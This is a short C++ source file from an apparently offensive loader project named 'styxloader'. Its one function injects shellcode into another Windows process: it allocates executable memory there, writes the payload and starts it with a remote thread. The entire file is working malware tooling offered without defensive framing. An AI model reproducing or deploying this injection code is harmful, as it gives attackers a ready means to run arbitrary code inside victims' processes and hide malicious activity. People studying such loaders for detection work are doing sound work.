#include "styxloader/simple_injector.hpp"

#include <windows.h>
#include <iostream>

namespace styxloader {

bool SimpleInject(HANDLE hProcess, PVOID shellcode, SIZE_T size) {
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        std::cout << "Error allocating memory." << std::endl;
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode, size, &bytesWritten)) {
        std::cout << "Error writing memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pRemoteMemory,
                                        NULL, 0, NULL);
    if (!hThread) {
        std::cout << "Error creating remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    return true;
}

}  // namespace styxloader
